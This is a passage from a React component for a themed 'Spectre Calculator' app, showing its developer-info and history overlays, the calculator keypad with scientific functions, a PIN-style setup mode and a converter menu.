              {setupStep === 0 ? "Enter Recovery Mobile Number & press =" : "Enter a 4-digit code and press ="}
           </p>
         </div>
       )}

       {/* Info Overlay */}
       {showInfo && (
         <div className={`absolute top-16 right-4 z-50 p-5 rounded-2xl shadow-2xl border animate-in slide-in-from-right-4 duration-300 w-72 overflow-y-auto max-h-[80vh] ${theme === 'neon' ? 'bg-black/95 border-green-500 text-green-400 font-mono shadow-[0_0_20px_rgba(0,255,0,0.2)]' : 'bg-[#1e1e1e] border-zinc-700 text-white shadow-2xl'}`}>
            <div className="flex justify-between items-start mb-4">
               <div className="flex items-center gap-2"><User className="w-5 h-5 text-orange-500" /><span className="font-bold text-base">Developer Info</span></div>
               <button onClick={() => setShowInfo(false)} className="opacity-60 hover:opacity-100 p-1"><X className="w-5 h-5"/></button>
            </div>
            <h2 className="text-xl font-bold mb-1">Suvojeet Naskar</h2>
            <p className="text-sm opacity-70 mb-4">Full Stack Developer</p>
            {/* Social Links */}
            <div className="flex gap-4 mb-5 justify-center">
              <a href="https://github.com/DE-CODEX1" target="_blank" rel="noopener noreferrer" className="p-2 bg-white/5 rounded-full hover:bg-white/20 transition-colors text-white hover:text-white" title="GitHub">
                <Github className="w-5 h-5" />
              </a>
              <a href="https://www.facebook.com/share/16TXHuU1XW/" target="_blank" rel="noopener noreferrer" className="p-2 bg-blue-600/20 rounded-full hover:bg-blue-600/40 transition-colors text-blue-500" title="Facebook">
                <Facebook className="w-5 h-5" />
              </a>
              <a href="https://wa.me/message/F57FT6Y4ODU6D1" target="_blank" rel="noopener noreferrer" className="p-2 bg-green-600/20 rounded-full hover:bg-green-600/40 transition-colors text-green-500" title="WhatsApp">
                <MessageCircle className="w-5 h-5" />
              </a>
              <a href="mailto:teams3655@gmail.com" className="p-2 bg-red-600/20 rounded-full hover:bg-red-600/40 transition-colors text-red-500" title="Email">
                <Mail className="w-5 h-5" />
              </a>
            </div>
            <div className="text-[10px] opacity-40 border-t border-white/10 pt-3 mt-4 text-center">
               Spectre Calculator v1.0
            </div>
         </div>
       )}

       {/* History Overlay */}
       {showHistory && (
         <>
           <div className="absolute inset-0 z-30 bg-black/50 backdrop-blur-sm" onClick={() => setShowHistory(false)} />
           <div className={`absolute top-20 left-4 right-4 z-40 p-4 rounded-2xl backdrop-blur-md shadow-2xl border animate-in slide-in-from-top-2 ${theme === 'neon' ? 'bg-black/95 border-green-500 text-green-400 font-mono' : 'bg-zinc-800/95 border-zinc-700 text-gray-200'}`}>
             <div className="flex justify-between items-center mb-3 border-b pb-2 border-white/10">
                <span className="text-xs font-bold uppercase tracking-wider flex gap-2 items-center"><History className="w-3 h-3" /> History</span>
                <button onClick={clearHistory} className="text-xs flex items-center gap-1 opacity-70 hover:opacity-100"><Trash2 className="w-3 h-3" /> Clear</button>
             </div>
             {history.length === 0 ? <div className="text-center py-6 opacity-40 text-sm">No calculations yet</div> : 
               <div className="space-y-2 max-h-56 overflow-y-auto pr-1">
                 {history.map((item, index) => {
                    const parts = item.split(' = ');
                    return (
                      <div key={index} className="flex flex-col text-right p-2 rounded hover:bg-white/5">
                         <span className="text-xs opacity-60 font-mono">{parts[0]} =</span>
                         <span className="text-lg font-medium tracking-tight">{parts[1]}</span>
                      </div>
                    )
                 })}
               </div>
             }
           </div>
         </>
       )}

       {/* MAIN VIEW LOGIC */}
       {activeConverter ? (
           renderConverterScreen()
       ) : (viewMode === 'calculator' || isSetupMode) ? (
        <>
          <div className="flex-1 flex flex-col justify-end items-end mb-4 px-4 relative z-10">
            <div className={`text-xl h-6 mb-2 transition-colors ${theme === 'neon' ? 'text-green-600 font-mono' : 'text-zinc-500'} ${equation ? 'opacity-100' : 'opacity-0'}`}>{equation}</div>
            <div className={`font-light break-all leading-none transition-all ${display.length > 10 ? 'text-4xl' : display.length > 7 ? 'text-5xl' : 'text-7xl'} ${isGlitching ? 'glitch-active' : ''} ${theme === 'neon' ? 'font-mono text-green-400' : ''}`}>
              {display}
            </div>
          </div>

          <div className={`grid ${isScientific ? 'grid-cols-5' : 'grid-cols-4'} gap-2 relative z-10 px-2 pb-2 transition-all duration-300 ease-in-out`}>
            {renderRow0()}
            {renderRow1()}
            
            {isScientific && <Button label="√x" onClick={() => handleScientificFunc('sqrt')} theme={theme} variant="feature" />}
            <Button label="AC" onClick={handleClear} theme={theme} variant="secondary" />
            <Button label={<BackspaceIcon className="w-6 h-6"/>} onClick={handleBackspace} theme={theme} variant="secondary" />
            <Button label="%" onClick={handlePercent} theme={theme} variant="secondary" />
            <Button label="÷" onClick={() => handleOperator('/')} theme={theme} variant="secondary" />

            {isScientific && <Button label="x!" onClick={() => handleScientificFunc('factorial')} theme={theme} variant="feature" />}
            <Button label="7" onClick={() => handleInput('7')} theme={theme} />
            <Button label="8" onClick={() => handleInput('8')} theme={theme} />
            <Button label="9" onClick={() => handleInput('9')} theme={theme} />
            <Button label="×" onClick={() => handleOperator('*')} theme={theme} variant="secondary" />

            {isScientific && <Button label="1/x" onClick={() => handleScientificFunc('inverse')} theme={theme} variant="feature" />}
            <Button label="4" onClick={() => handleInput('4')} theme={theme} />
            <Button label="5" onClick={() => handleInput('5')} theme={theme} />
            <Button label="6" onClick={() => handleInput('6')} theme={theme} />
            <Button label="-" onClick={() => handleOperator('-')} theme={theme} variant="secondary" />

            {isScientific && <Button label="π" onClick={() => handleInput('PI')} theme={theme} variant="feature" />}
            <Button label="1" onClick={() => handleInput('1')} theme={theme} />
            <Button label="2" onClick={() => handleInput('2')} theme={theme} />
            <Button label="3" onClick={() => handleInput('3')} theme={theme} />
            <Button label="+" onClick={() => handleOperator('+')} theme={theme} variant="secondary" />

            <Button 
              label={<LayoutGrid className={`w-5 h-5 ${isScientific ? 'text-green-400' : ''}`} />} 
              onClick={() => !isSetupMode && setIsScientific(!isScientific)} 
              theme={theme} 
              variant="feature"
              className={isSetupMode ? 'opacity-30' : ''} 
            />
            {isScientific && <Button label="e" onClick={() => handleInput('E')} theme={theme} />}
            <Button label="0" onClick={() => handleInput('0')} theme={theme} />
            <Button label="." onClick={handleDecimal} theme={theme} />
            <Button label={isSetupMode ? (setupStep === 0 ? "NEXT" : "SAVE") : "="} onClick={handleEqual} theme={theme} variant="accent" className={isSetupMode ? "text-lg font-bold" : ""} />
          </div>
        </>
      ) : (
        <div className="flex-1 flex items-center justify-center p-4 relative z-10 overflow-y-auto">
          <div className="grid grid-cols-3 gap-x-6 gap-y-10 w-full max-w-[340px]">
             {convertersList.map((item, idx) => (
                <button key={idx} onClick={() => openConverter(item.name)} className={`flex flex-col items-center gap-3 group transition-transform active:scale-95 ${theme === 'neon' ? 'text-green-500' : 'text-gray-300'}`}>
                   <div className={`p-4 rounded-3xl transition-all duration-300 ${theme === 'neon' ? 'bg-black border border-green-800' : 'bg-[#181818] group-hover:bg-[#252525]'}`}>
                      <item.icon className={`w-6 h-6 ${theme === 'neon' ? 'text-green-400' : 'text-white'}`} />
                   </div>
                   <span className="text-xs font-medium tracking-wide">{item.name}</span>
                </button>
             ))}
          </div>
        </div>
      )}
      
      <div className={`absolute bottom-1 left-0 w-full text-center text-[10px] pointer-events-none opacity-20 ${theme === 'neon' ? 'text-green-800' : 'text-gray-600'}`}>
        Spectre Calculator
      </div>
    </div>
  );
};

export default Calculator;